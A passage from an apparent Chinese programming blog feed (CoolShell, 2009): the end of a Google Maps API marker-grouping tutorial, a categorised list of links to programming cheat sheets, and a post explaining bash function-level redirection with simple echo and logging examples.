<span class="ez-toc-section" id="%E5%8A%A0%E5%85%A5%E5%A4%9A%E4%B8%AA%E6%A0%87%E8%AE%B0%E5%B9%B6%E5%88%86%E7%BB%84"></span>加入多个标记并分组<span class="ez-toc-section-end"></span>
</h4>
<p>我们可以标记多个地点，并可以把它们根据我们的需要分组。这样一来，我们可以通过不同的标记图标来显示地点的不同属性，比如：酒店，车站等。要做到这样，我们只需要使用一个XML文件，一个简单的XML文件如下所示：</p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;markers&gt;
&lt;marker
    name="标题"
    label="这是一个标签"
    desc="气球提示的描述"
    lat="37.97167" lng="23.72581"
    type="标签的种类，如 Bridge"
    address="地址信息"
    icona="图标"
/&gt;
&lt;/markers&gt;
</pre>
<p>你可以在这个XML文件中加入多个地点信息。有一件事你需要小心的是，当出现一一些特定字符时（比如单引号，双引号，<a href="/cdn-cgi/l/email-protection#9173110db2d1b5">“#@$</a>&lt;&gt;”等），你需要使用HTML的转义。</p>
<p>使用这XML的脚本如下：</p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">&lt;script src="http://gmaps-utility-library.googlecode.com/svn/trunk/labeledmarker/release/src/labeledmarker.js" type="text/javascript"&gt;&lt;/script&gt;</code></p>
<p>当然，你需要设置一些参数：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var iconRed = new GIcon();
iconRed.image = '../img/marker-red.png';
iconRed.shadow = '';
iconRed.iconSize = new GSize(32, 32);
iconRed.shadowSize = new GSize(22, 20);
iconRed.iconAnchor = new GPoint(16, 16);
iconRed.infoWindowAnchor = new GPoint(5, 1);
var customIcons = [];

customIcons["ancient"] = iconRed;
var markerGroups = { "ancient": []};</pre>
<p>上面，我们给customIcons 的“ancient”属性设置成了iconRed ，于是我们应该在我们的XML文件中使用类型(ancient) ，如果我们把这个XML文件命名为： markers.xml，那么，我们的代码如下：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">GDownloadUrl("markers.xml", function(data) { //We tell Google Maps to load our file
        var xml = GXml.parse(data);
        var markers = xml.documentElement.getElementsByTagName("marker"); //and read markers
        for (var i = 0; i &lt; markers.length; i++) {
            var name = markers[i].getAttribute("name"); //From here down we assign variables.
            var label = markers[i].getAttribute("label");
            var desc = markers[i].getAttribute("desc");
            var address = markers[i].getAttribute("address");
            var type = markers[i].getAttribute("type");
            var icona = markers[i].getAttribute("icona");
            var point = new GlatLng(parseFloat(markers[i].getAttribute("lat")), //and we set the lat-long
            parseFloat(markers[i].getAttribute("lng")));
            var marker = createMarker(point, name, label, desc, address, type, icona);
            map.addOverlay(marker);
        }
    });
}
}

function createMarker(point, name, label, desc, address, type, icona) {
    var marker = new LabeledMarker(point, {icon: customIcons[type], labelText: label, labelOffset: new GSize(-6, -8)})
};
</pre>
<p>要分组标记，你需要下面的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">    markerGroups[type].push(marker);
    var html = "&lt;img src=" + icona + " height=150 border=0 /&gt;&lt;br&gt;&lt;br&gt;&lt;span&gt;&lt;b&gt;"+ name + "&lt;/b&gt;&lt;br/&gt;" +
            desc + "&lt;br/&gt;&lt;b&gt;Address:&lt;/b&gt; " + address + "&lt;br/&gt;&lt;br/&gt;&lt;span&gt;";
    GEvent.addListener(marker, 'click', function() {
        marker.openInfoWindowHtml(html);
    });
    return marker;
}
</pre>
<p>要使用不同的图标，你可以使用相同的方法。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var iconRed = new GIcon();
iconRed.image = '../img/marker-red.png';
iconRed.shadow = '';
iconRed.iconSize = new GSize(32, 32);
iconRed.shadowSize = new GSize(22, 20);
iconRed.iconAnchor = new GPoint(16, 16);
iconRed.infoWindowAnchor = new GPoint(5, 1);

var iconGreen = new GIcon();
iconGreen.image = '../img/marker-green.png';
iconGreen.shadow = '';
iconGreen.iconSize = new GSize(32, 32);
iconGreen.shadowSize = new GSize(22, 20);
iconGreen.iconAnchor = new GPoint(16, 16);
iconGreen.infoWindowAnchor = new GPoint(5, 1);

var iconBrown = new GIcon();
iconBrown.image = '../img/marker-brown.png';
iconBrown.shadow = '';
iconBrown.iconSize = new GSize(32, 32);
iconBrown.shadowSize = new GSize(22, 20);
iconBrown.iconAnchor = new GPoint(16, 16);
iconBrown.infoWindowAnchor = new GPoint(5, 1);

var customIcons = [];

customIcons["hotel"] = iconRed;
customIcons["bridge"] = iconGreen;
customIcons["hill"] = iconBrown;
var markerGroups = { "hotel": [], "bridge": [], "hill": []};</pre>
<p>所以，如果我们在XML 文件中设置了不同的种类，如：hotel，bridge 和 hill，我们也应该需要不同的颜色和图标。</p>
<h4>
<span class="ez-toc-section" id="%E8%BF%87%E6%BB%A4%E6%98%BE%E7%A4%BA%E6%A0%87%E8%AE%B0"></span>过滤显示标记<span class="ez-toc-section-end"></span>
</h4>
<p>我们还可以让我们的标记更友好一些。我们可以让用户决定是否显示标记，这样的话，地图上的标记就不会太多，也会根据用户的需求来显示相当的标记。我们可以使用几个按钮，复选框，或是链接来完成这个事情。要做到这个事，你需要在“<em>map.addMapType(G_SATELLITE_3D_MAP); </em>”后面加入下面的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">document.getElementById("hotelCheckbox").checked = true;
document.getElementById("bridgeCheckbox").checked = true;
document.getElementById("hillCheckbox").checked = true;
document.getElementById("labelsCheckbox").checked = true;
</pre>
<p>然后再加入下面的这些 JavaScript 的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function toggleGroup(type) {
    for (var i = 0; i &lt; markerGroups[type].length; i++) {
        var marker = markerGroups[type][i];
        if (marker.isHidden()) {
            marker.show();
        } else {
            marker.hide();
        }
    }
}

function toggleLabels() {
    var showLabels = document.getElementById("labelsCheckbox").checked;
    for (groupName in markerGroups) {
        for (var i = 0; i &lt; markerGroups[groupName].length; i++) {
            var marker = markerGroups[groupName][i];
            marker.setLabelVisibility(showLabels);
        }
    }
}

function hideAll() {
    var boxes = document.getElementsByName("mark");
    for(var i = 0; i &lt; boxes.length; i++) {
        if(boxes[i].checked) {
            boxes[i].checked = false;
            switchLayer(false, layers[i].obj);
            chosen.push(i);
        }
    }
}

function checkChecked() {
    var boxes = document.getElementsByName("mark");
    for(var i = 0; i &lt; boxes.length; i++) {
        if(boxes[i].checked) return true;
    }
    return false;
}</pre>
<p>最后一件事是加如几个checkbox ：</p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;input type="hidden" id="labelsCheckbox" onclick="toggleLabels()" checked=”checked” /&gt;
&lt;label for=”hotelCheckbox”&gt;Hotels&lt;/label&gt;&lt;input type="checkbox" id="hotelCheckbox" onclick="toggleGroup('hotel')" checked=”checked” /&gt;
&lt;label for=”bridgeCheckbox”&gt;Bridges&lt;/label&gt;&lt;input type="checkbox" id="bridgeCheckbox" onclick="toggleGroup('bridge')" checked=”checked” /&gt;
</pre>
<p>我们 Google Maps 就绪了，这篇文章讲述了Google Map API中你应该知道的。希望这篇文章对你有帮助。</p>
<p>文章：<a href="http://jeez.eu/2009/10/09/google-maps-from-a-to-z/" target="_blank">来源</a></p>
 ]]></content>
<pubDate>2009-10-13T15:41:23+08:00</pubDate>
<guid>https://coolshell.cn/articles/1561.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员小抄大全 ]]></title>
<link>https://coolshell.cn/articles/1566.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >你是否会经常忘记一些CSS中的函数名或是一些属性名，那个时候，你一定觉得，如果手边有一个“小抄”（Cheat Sheet）就好了。当然，这个“小抄”不是给你作弊用的，这个“小纸条”就是可以让你马上知道那个你最想知道的东西。这个“小抄”上也不需要有所有的东西，就需要那些经常用的就行了。现在，网上有很多这样的“小抄”，它们可能是PDF格式的，可能是PNG格式的，你可以很方便地把其打印出来（可以打印得很小），然后贴在你的电脑旁，一但需要，瞟一眼就可以了，这对于我们的工作是相当方便的。</p>
<p>之前，酷壳也有两篇关于速查卡的文章《<a rel="bookmark" href="https://coolshell.cn/articles/870.html">Web设计的速查卡</a>》和《<a rel="bookmark" href="https://coolshell.cn/articles/150.html">Vim命令速查卡</a>》，不过都不如本贴多。</p>
<p>下面是N多的各种和样的“小抄”，其中包括了Ajax, C++, Java, Python, PHP, Perl, ASP, Unix, Ruby, Google, HTML, CSS, XML ……..，让我们姑且叫做“程序员小抄大全”吧。当然，他们都是英文版的，可能某些链接你可能需要翻墙软件才能访问。我这里就不教你怎么翻墙了，这样的贴子网上多的是。</p>
<p><span id="more-1566"></span></p>
<p><strong>Actionscript</strong></p>
<ul>
<li><a href="http://actionscriptcheatsheet.com/blog/quick-referencecheatsheet-for-actionscript-20/">Quick reference/Cheatsheet for ActionScript 2.0</a></li>
</ul>
<p><strong>Ajax</strong></p>
<ul>
<li><a href="http://slash7.com/cheats/whats_ajax_cheatsheet.pdf">What’s Ajax? Cheat Sheet — PDF</a></li>
<li><a href="http://www.snook.ca/archives/javascript/prototype_disse/">Prototype Dissected — Cheat Sheet PNG</a></li>
<li><a href="http://slash7.com/cheats/scriptaculous_fx1.pdf">scriptaculous Combination Effects — Cheat Sheet — PDF</a></li>
</ul>
<p><strong>Apache</strong></p>
<ul>
<li><a href="http://www.petefreitag.com/cheatsheets/apache/">Apache Cheat Sheet</a></li>
<li><a href="http://www.thejackol.com/htaccess-cheatsheet/">htaccess Cheatsheet</a></li>
<li><a href="http://www.addedbytes.com/mod_rewrite_cheat_sheet.png">mod_rewrite Cheat Sheet — PNG</a></li>
<li><a href="http://www.addedbytes.com/mod_rewrite_cheat_sheet.pdf">mod_rewrite Cheat Sheet — PDF</a></li>
</ul>
<p><strong>ASCII Character Codes</strong></p>
<ul>
<li><a href="http://www.cookwood.com/html/extras/entities.html">Character Entity References in HTML 4 and XHTML 1.0</a></li>
<li><a href="http://www.addedbytes.com/characters_cheat_sheet.png">HTML Character Entities Cheat Sheet — PNG</a></li>
<li><a href="http://www.addedbytes.com/characters_cheat_sheet.pdf">HTML Character Entities Cheat Sheet — PDF</a></li>
<li><a href="http://www.chami.com/tips/internet/050798I.html">HTML special character reference</a></li>
<li><a href="http://tlt.its.psu.edu/suggestions/international/web/codehtml.html">HTML — Special Entity Codes</a></li>
<li><a href="http://www.yellowpipe.com/yis/tools/ASCII-HTML-Characters/index.php">Special ASCII HTML Character Codes</a></li>
<li><a href="http://www.digitalmediaminute.com/reference/entity/index.php">XHTML Character Entity Reference</a></li>
</ul>
<p><strong>ASP</strong></p>
<ul>
<li><a href="http://www.addedbytes.com/asp_cheat_sheet.png">ASP / VBScript Cheat Sheet — PNG</a></li>
</ul>
<p><strong>C# and VB.NET</strong></p>
<ul>
<li><a href="http://aspalliance.com/625">C# and VB.NET Comparison Cheat Sheet — PDF</a></li>
<li><a href="http://www.codeproject.com/dotnet/CheatSheetCastingNET.asp">Cheat Sheet — Casting in VB.NET and C#</a></li>
</ul>
<p><strong>CSS</strong></p>
<ul>
<li><a href="http://www.veign.com/downloads/guides/qrg0007.pdf">CSS 2 — Quick Reference Guide — PDF</a></li>
<li><a href="http://www.addedbytes.com/css_cheat_sheet.pdf">CSS Cheat Sheet — PDF</a></li>
<li><a href="http://www.addedbytes.com/css_cheat_sheet.png">CSS Cheat Sheet — PNG</a></li>
<li><a href="http://www.blooberry.com/indexdot/css/propindex/all.htm">CSS Property Index</a></li>
<li><a href="http://home.tampabay.rr.com/bmerkey/cheatsheet.htm">Cascading Style Cheatsheet</a></li>
<li><a href="http://www.dustindiaz.com/css-shorthand/">CSS Shorthand Guide</a></li>
</ul>
<p><strong>CVS</strong></p>
<ul>
<li><a href="http://www-bcl.cs.unm.edu/computers/cvs.html">CVS Cheat Sheet</a></li>
<li><a href="http://www.cs.put.poznan.pl/csobaniec/Papers/svn-refcard.pdf">Subversion Quick Reference Card — PDF</a></li>
<li><a href="http://www.slac.stanford.edu/grp/cd/soft/cvs/cvs_cheatsheet.html">CVS Cheat-sheet</a></li>
</ul>
<p><strong>C++</strong></p>
<ul>
<li><a href="http://www.linuxsoftware.co.nz/cppcontainers.html">C++ Containers Cheat Sheet</a></li>
<li><a href="http://downloads.dreamincode.net/ref_sheets/cpp_reference_sheet.pdf">C++ Quick Reference Sheet (Cheat Sheet) — PDF</a></li>
<li><a href="http://cs.fit.edu/%7Emmahoney/cse2050/how2cpp.html">How to Program in C++ — Language Summary</a></li>
</ul>
<p><strong>Django</strong></p>
<ul>
<li><a title="The Django Book" href="http://www.djangobook.com/">The Django Book</a></li>
</ul>
<p><strong>Firefox</strong></p>
<ul>
<li><a href="https://the-cream.blogspot.com/2006/10/firefox-keyboard-shortcuts.html">Firefox Keyboard Shortcuts — PDF</a></li>
<li><a href="http://www.accessfirefox.com/ShortcutsKandM.html">Firefox Shortcuts Sheet</a></li>
<li><a href="http://lesliefranke.com/2006/06/22/mozilla-firefox-cheat-sheet-update/">Mozilla Firefox Cheat Sheet</a></li>
<li><a href="http://lesliefranke.com/files/reference/thunderbirdcheatsheet.html">Mozilla Thunderbird Cheat Sheet</a></li>
<li><a href="https://www.mozilla.org/support/firefox/keyboard">Keyboard Shortcuts</a></li>
</ul>
<p><strong>Google</strong></p>
<ul>
<li><a href="http://evhead.com/hodgepodge/gmail-shortcuts.html">Gmail Shortcuts (printable cheatsheet)</a></li>
<li><a href="http://www.googleguide.com/advanced_operators_reference.html">Google Advanced Operators (Cheat Sheet)</a></li>
<li><a href="http://www.adelaider.com/google/">Google Cheat Sheet (Version 1.06) — PDF</a></li>
<li><a href="https://www.bueltge.de/allg-google-cheat-sheet/42/">Google Cheat Sheet — auch als PDF</a></li>
<li><a href="http://www.feedsforme.com/google/">Google Cheat Sheets — auch als PDF</a></li>
<li><a href="https://www.google.com/help/cheatsheet.html">Google Help : Cheat Sheet</a></li>
</ul>
<p><strong>HTML/XHTML</strong></p>
<ul>
<li><a href="http://www.alphalink.com.au/%7Erhduncan/htmlguide/cheatindex.html">A Simple Guide To HTML — Cheat Sheet</a></li>
<li><a href="http://library.albany.edu/imc/pdf/HTML-XHTML_Tag_Sheet.pdf">HTML &amp; XHTML Tag Quick Reference</a></li>
<li><a href="http://www.psacake.com/web/dy.asp">HTML Cheat Sheet</a></li>
<li><a href="http://www.cookwood.com/html/extras/entities.html">HTML Entities</a></li>
<li><a href="http://www.killersites.com/HTML_CODES/index.jsp">HTML CODES CHEAT SHEET</a></li>
<li><a href="https://cdburnerxp.se/htmlcheatsheet.pdf">XHTML</a></li>
<li><a href="http://www.angelfire.com/nm/thehtmlsource/html/cheatsheet.html">HTML Cheat Sheet</a></li>
<li><a href="https://cdburnerxp.se/htmlcheatsheet.pdf">XHTML Cheat Sheet v. 1.03 — PDF</a></li>
</ul>
<p><strong>Java</strong></p>
<ul>
<li><a href="http://www.janeg.ca/JQREF.pdf">Java Quick Reference — PDF</a></li>
<li>
<a href="http://java.sun.com/products/jsp/syntax/1.1/card11.pdf">(</a><a href="http://java.sun.com/products/jsp/syntax/1.1/card11.pdf">JSPª) SYNTAX version 1.1</a>
</li>
<li><a href="http://java.sun.com/products/jsp/syntax/2.0/card20.pdf">(JSP™) SYNTAX version 2.0</a></li>
</ul>
<p><strong>JavaScript</strong></p>
<ul>
<li><a href="http://www.addedbytes.com/javascript_cheat_sheet.png">JavaScript Cheat Sheet — PNG</a></li>
<li><a href="http://www.addedbytes.com/javascript_cheat_sheet.pdf">JavaScript Cheat Sheet — PDF</a></li>
<li><a href="http://javascript-reference.info/">JavaScript Reference</a></li>
<li><a href="http://www.dannyg.com/ref/jsquickref.html">JavaScript and Browser Objects Quick Reference</a></li>
<li><a href="http://www.visibone.com/regular-expressions/">Regular Expressions for JavaSript — free online quick reference</a></li>
</ul>
<p><strong>Microformats</strong></p>
<ul>
<li><a href="http://www.addedbytes.com/cheat-sheets/microformats-cheat-sheet/">Microformats Cheat Sheet</a></li>
<li><a href="http://suda.co.uk/projects/microformats/cheatsheet/">Microformats Cheat Sheet</a></li>
</ul>
<p><strong>Misc</strong></p>
<ul>
<li><a href="http://www.draac.com/chmodchart.html">CHMOD Chart</a></li>
<li><a href="http://photonotes.org/cgi-bin/view.pl?letter=%21">Complete listing of common camera symbols.</a></li>
<li><a href="https://www.sql-und-xml.de/unicode-database/">The Unicode-Database</a></li>
<li><a href="http://www.addedbytes.com/colourchart.png">RGB Hex Colour Chart — PNG</a></li>
<li><a href="http://www.geocities.com/Athens/1802/pgpcard.html">Pretty Good PGP Reference Card</a></li>
<li><a href="http://www.aiic.net/ViewPage.cfm/page302.htm">Search Engine Cheat Sheet</a></li>
<li><a href="http://www.digilife.be/quickreferences/quickrefs.htm">Quick Reference Cards</a></li>
</ul>
<p><strong>MySQL</strong></p>
<ul>
<li><a href="http://www.nparikh.org/unix/mysql.php">MySQL Cheat Sheet</a></li>
<li><a href="http://www.addedbytes.com/mysql_cheat_sheet.pdf">MySQL Cheat Sheet — PDF</a></li>
<li><a href="http://www.addedbytes.com/mysql_cheat_sheet.png">MySQL Cheat Sheet — PNG</a></li>
<li><a href="http://www.3gwt.net/demo/SQL_redux.html">SQL Cheatsheet</a></li>
</ul>
<p><strong>Oracle</strong></p>
<ul>
<li><a href="http://www.yagc.ndo.co.uk/cheatsheets/plsql_cheatsheet.html">Oracle PL/SQL Cheatsheet</a></li>
<li><a href="http://www.vttoth.com/oracle.htm">Oracle Cheat Sheet</a></li>
<li><a href="http://radio.weblogs.com/0128037/stories/2003/10/21/oracleScmInstallationCheatSheet.html">Oracle SCM Installation Cheat Sheet</a></li>
</ul>
<p><strong>Perl</strong></p>
<ul>
<li><a href="http://www.mnlab.cs.depaul.edu/%7Eehab/Courses/TDC568/resources/PerlQuickRef.pdf">Perl Regular Expression -Quick Reference — PDF</a></li>
<li><a href="http://juerd.nl/site.plp/perlcheat">Perl Cheat Sheet</a></li>
<li><a href="http://juerd.nl/site.plp/perlcheat">Perl Cheat Sheet</a></li>
<li><a href="http://search.cpan.org/%7Enwclark/perl-5.8.7/pod/perlcheat.pod">Perl 5 Cheat Sheet</a></li>
<li><a href="http://johnbokma.com/perl/perl-quick-reference-card.html">Perl Quick Reference Card — PDF</a></li>
<li><a href="http://refcards.com/refcards/perl-regexp/index.html">Perl Regexp Quick Reference Card — PDF</a></li>
</ul>
<p><strong>Photoshop/Gimp</strong></p>
<ul>
<li><a href="http://frenchfragfactory.net/ozh/download/refcards/Gimp.pdf">Gimp Quick Reference Card v.1.0</a></li>
<li><a href="http://frenchfragfactory.net/ozh/download/refcards/Photoshop.pdf">Photoshop 7.0 Quick Reference Card for Windows — PDF</a></li>
<li><a href="http://www.creativetechs.com/tips/tip_resources/PSCS2_Shortcuts_Windows.pdf">Photoshop CS2 Keyboard Shortcuts (Windows) — PDF</a></li>
<li><a href="http://www.creativetechs.com/tips/tip_resources/PSCS2_Shortcuts_Mac.pdf">Photoshop CS2 Keyboard Shortcuts (Macintosh) — PDF</a></li>
</ul>
<p><strong>PHP</strong></p>
<ul>
<li><a href="http://www.symfony-project.com/weblog/2006/04/25/admin-generator-cheat-sheet.html">symfony PHP5 framework — Admin Generator cheat sheet — PDF</a></li>
<li><a href="http://www.addedbytes.com/php_cheat_sheet.pdf">PHP Cheat Sheet — PDF</a></li>
<li><a href="http://www.addedbytes.com/php_cheat_sheet.png">PHP Cheat Sheet — PNG</a></li>
<li><a href="http://www.blueshoes.org/en/developer/php_cheat_sheet/">PHP Cheat Sheet with special php syntax</a></li>
<li><a href="http://www.addedbytes.com/regular_expressions_cheat_sheet.png">Regular Expressions Cheat Sheet — PNG</a></li>
</ul>
<p><strong>Python</strong></p>
<ul>
<li><a href="http://www-128.ibm.com/developerworks/library/l-cheatsheet3.html">Python 101 cheat sheet</a></li>
<li><a href="http://www.yukoncollege.yk.ca/%7Ettopper/COMP118/rCheatSheet.html">Python Cheat Sheet</a></li>
<li><a href="http://www.drweb.de/weblog/weblog/?p=548">Python Cheat Sheet — PDF</a></li>
<li><a href="http://www.onlamp.com/python/excerpt/PythonPocketRef/examples/python.pdf">Python Quick Reference</a></li>
<li><a href="http://rgruet.free.fr/PQR24/PQR2.4.html">Python 2.4 Quick Reference</a></li>
</ul>
<p><strong>Regular Expressions</strong></p>
<ul>
<li><a href="http://www.addedbytes.com/cheat-sheets/regular-expressions-cheat-sheet/">Regular Expressions Cheat Sheet</a></li>
<li><a href="http://regexlib.com/CheatSheet.aspx">Regular Expression Cheat Sheet (.NET)</a></li>
</ul>
<p><strong>Ruby</strong></p>
<ul>
<li><a href="http://slash7.com/cheats/activerecord_cheatsheet.pdf">ActiveRecord Relationships — Ruby on Rails cheat sheet guide — PDF</a></li>
<li><a href="http://www.blainekendall.com/index.php/rubyonrailscheatsheet/">RubyOnRails-Cheatsheet — PDF</a></li>
<li><a href="http://www.addedbytes.com/ruby_on_rails_cheat_sheet.png">Ruby on Rails Cheat Sheet — PNG</a></li>
<li><a href="http://slash7.com/cheats/form_helpers.pdf">Ruby on Rails cheat sheet guide — PDF</a></li>
<li><a href="https://www.zenspider.com/Languages/Ruby/QuickRef.html">Ruby quick reference</a></li>
<li><a href="http://www.threaded.com/ruby_cheatsheet.htm">Threadeds Ruby Cheat Sheet</a></li>
<li><a href="http://slash7.com/cheats/rails_files_cheatsheet.pdf">What Goes Where? — Ruby on Rails cheat sheet — PDF</a></li>
</ul>
<p><strong>Unix/Linux</strong></p>
<ul>
<li><a href="http://www.unixguide.net/linux/linuxshortcuts.shtml">Linux Shortcuts and Commands</a></li>
<li><a href="http://aperiodic.net/screen/quick_reference?do=show">quick_reference [GNU screen]</a></li>
<li><a href="https://www.pixelbeat.org/cmdline.html">Unix Cheat Sheet</a></li>
<li><a href="http://homepage.powerup.com.au/%7Esquadron/linux_manual.pdf">The One Page Linux Manual — Version 3 — PDF </a></li>
<li><a href="http://www.gasmi.net/docs/tcp.html">TCP Ports list (3498 ports in list) </a></li>
<li><a href="http://www.rain.org/%7emkummel/unix.html">Treebeard’s Unix Cheat Sheet</a></li>
<li><a href="https://www.pixelbeat.org/vim.tips.html">Essential Vim keyboard shortcuts Cheat Sheet</a></li>
<li><a href="http://tnerual.eriogerg.free.fr/vim.html">VIM Quick Reference Card</a></li>
<li><a href="http://bullium.com/support/vim.html">Vim Commands Cheat Sheet</a></li>
</ul>
<p><strong>Weblog</strong></p>
<ul>
<li><a href="http://andywibbels.com/files/Blogger_Cheatsheet_v1.pdf">Blogger Cheatsheet — PDF</a></li>
<li><a href="http://andywibbels.com/files/TypePad_Cheatsheet_v1.pdf">TypePad Cheatsheet — PDF</a></li>
<li><a href="http://andywibbels.com/files/Movable_Type_Cheatsheet_v1.pdf">Movable Type Cheatsheet — PDF</a></li>
<li><a href="http://www.einfach-persoenlich.de/2005-05-29/movabletype-movable-type-cheat-sheet-spickzettel.html">MovableType</a></li>
<li><a href="http://andywibbels.com/files/WordPress_Cheatsheet_v1.pdf">WordPress Cheatsheet — PDF</a></li>
<li><a href="https://bueltge.de/wp-wordpress-cheat-sheet-fuer-theme-tags-und-plugin-api/205">WP — WordPress Cheat Sheet f眉r Theme Tags und Plugin-API — PDF</a></li>
</ul>
<p><strong>Windows</strong></p>
<ul>
<li><a href="https://www.ss64.com/nt/">An A-Z Index of the Windows NT/XP command line</a></li>
<li><a href="http://www.viemu.com/a_vi_vim_graphical_cheat_sheet_tutorial.html">Graphical vi-vim Cheat Sheet and Tutorial</a></li>
<li><a href="http://www.fgcu.edu/support/office2000/ppt/shortcuts.html">Power Point 2000 — Keyboard Shortcuts</a></li>
<li><a href="https://www.oreilly.com/examples/promos/pt/power_point_quickref.pdf">POWERPOINT 2003 — Quick Reference Card</a></li>
<li><a href="http://www.gasmi.net/docs/tcp.html">TCP Ports list (3498 ports in list) </a></li>
<li><a href="http://tlt.its.psu.edu/suggestions/international/accents/codealt.html">Windows — Alt Key Numeric Codes</a></li>
</ul>
<p><strong>XML</strong></p>
<ul>
<li><a href="http://www.dopefly.com/projects/fuseboxxmlcheatsheet.cfm">Fusebox 4.1 XML Cheat Sheet</a></li>
<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_mathML_el_attr.pdf?title=MathML%3A+elements+-+attributes">MathML Reference — PDF</a></li>
<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_voiceXML_el_attr.pdf?title=VoiceXML%3A+elements+-+attributes">VoiceXML Reference — PDF</a></li>
<li><a href="http://refcards.com/download/bj/xtm-1.0.pdf">XML TopicMaps 1.0 — Quick Reference Card — PDF</a></li>
<li><a href="http://www.mulberrytech.com/quickref/XMLquickref.pdf">XML Quick References — PDF</a></li>
<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_xmlSchema2001_child_parent.pdf?title=XML+Schema+2001%3A+children+-+parents">XML Schema 2001: children — parents — PDF</a></li>
<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_xmlSchema2001_el_attr.pdf?title=XML+Schema+2001%3A+elements+-+attributes">XML Schema 2001: elements — attributes — PDF</a></li>
<li><a href="http://www.zvon.org/Output/cheatsheets/cheatsheet_list.html">XML Schema 2000/10 — PDF</a></li>
<li><a href="http://www.xml.dvint.com/docs/SchemaStructuresQR-2.pdf">XML Schema — Structures Quick Reference — PDF</a></li>
<li><a href="http://www.xml.dvint.com/docs/SchemaDataTypesQR-2.pdf">XML Schema — Data Types Quick Reference — PDF</a></li>
<li><a href="http://www.zvon.org/download2_cheatsheet.php/sheet_xslReference_el_attr.pdf?title=XSL+FO%3A+elements+-+attributes">XSL FO Reference — PDF</a></li>
<li><a href="http://www.mulberrytech.com/quickref/XSLT_1quickref-v2.pdf">XSLT Quick References — PDF</a></li>
<li><a href="http://refcards.com/download/deepx/XSLT-1.0.pdf">XSLT Quick Reference Card — PDF</a></li>
<li><a href="http://www.topxml.com/xsl/XSLTRef.asp">XSLT Reference</a></li>
</ul>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-10-13T22:26:30+08:00</pubDate>
<guid>https://coolshell.cn/articles/1566.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ bash 函数级重定向 ]]></title>
<link>https://coolshell.cn/articles/1574.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >相信每一个人对于操作系统的重定向不会陌生了。就是&gt;, &gt;&gt;, &lt;, &lt;&lt;，关于重定向的基本知识我就不说了。这里主要讨论bash的重定向中的一个鲜为人知的东西，那就是bash脚本的函数也可以定义相关的重定向操作。这可不是命令级的重定向，这是函数级的重点向。这并不是一个新的东西，我只是想告诉大家一个已经存在了多年但却可能不被人常用的功能。</p>
<p>关于bash的这个函数级的重定向的语法其实很简单，你只需要在函数结尾时加上一些重定向的定义或指示符就可以了。下面是一个示例：</p>
<p>[bash]function mytest()<br>
{<br>
        …<br>
} &lt; mytest.in &gt; mytest.out 2&gt; mytest.err[/bash]</p>
<p>现在，只要是test被调用，那么，这个函数就会从mytest.in读入数据，并把输出重定向到mytest.out文件中，然后标准错误则输出到mytest.err文件中。是不是很简单？</p>
<p><span id="more-1574"></span></p>
<p>因为函数级的重定向仅当在被函数调用的时候才会起作用，而且其也是脚本的一部分，所以，你自然也可以使用变量来借文件名。下面是一个示例：</p>
<p>[bash]#!/bin/bash</p>
<p>function mytest()<br>
{<br>
    echo Hello World CoolShell.cn<br>
} &gt;$out</p>
<p>out=mytest1.out<br>
mytest<br>
out=mytest2.out<br>
mytest[/bash]</p>
<p>这样一来，标准输出的重定向就可以随$out变量的改变而改变了。在上面的例子中，第一个调是重定向到mytest1.out，第二个则是到mytest2.out。</p>
<p>[bash]$ bash mytest.sh; more mytest?.out<br>
::::::::::::::<br>
mytest1.out<br>
::::::::::::::<br>
Hello World CoolShell.cn<br>
::::::::::::::<br>
mytest2.out<br>
::::::::::::::<br>
Hello World CoolShell.cn[/bash]</p>
<p>正如前面所说的一样，这里并没有什么新的东西。上面的这个示例，转成传统的写法是：</p>
<p>[bash]#!/bin/bash</p>
<p>function mytest()<br>
{<br>
    echo Hello World CoolShell.cn<br>
}<br>
mytest &gt;mytest1.out<br>
mytest &gt;mytest2.out[/bash]</p>
<p>到此为此，好像这个feature并没有什么特别的实用之处。有一个可能比较实用的用法可能是把把你所有代码的的标准错误重定向到一个文件中去。如下面所示：</p>
<p>[bash]#!/bin/bash</p>
<p>log=err.log<br>
function error()<br>
{<br>
    echo "$*" &gt;&amp;2<br>
}<br>
function mytest1()<br>
{<br>
    error mytest1 hello1 world1 coolshell.cn<br>
}</p>
<p>function mytest2()<br>
{<br>
    error mytest2 hello2 world2 coolshell.cn<br>
}</p>
<p>function main()<br>
{<br>
    mytest1<br>
    mytest2<br>
} 2&gt;$log</p>
<p>main[/bash]</p>
<p>运行上面的脚本，你可以得到下面的结果：</p>
<p>[bash]$ bash mytest.sh ;cat err.log<br>
mytest1 hello1 world1 coolshell.cn<br>
mytest2 hello2 world2 coolshell.cn[/bash]</p>
<p>当然，你也可以不用定义一个函数，只要是{…} 语句块，就可以使用函数级的重定向，就如下面的示例一样：</p>
<p>[bash]#!/bin/bash</p>
<p>log=err.log<br>
function error()<br>
{<br>
    echo "$*" &gt;&amp;2<br>
}<br>
function mytest1()<br>
{<br>
    error mytest1 hello1 world1 coolshell.cn<br>
}</p>
<p>function mytest2()<br>
{<br>
    error mytest2 hello2 world2 coolshell.cn<br>
}</p>
<p>{<br>
mytest1<br>
mytest2<br>
} 2&gt;$log[/bash]</p>
<p>你也可以重定向 (…) 语句块，但那会导致语句被执行于一个sub-shell中，这可能会导致一些你不期望的行为或问题，因为sub-shell是在另一个进程中。</p>
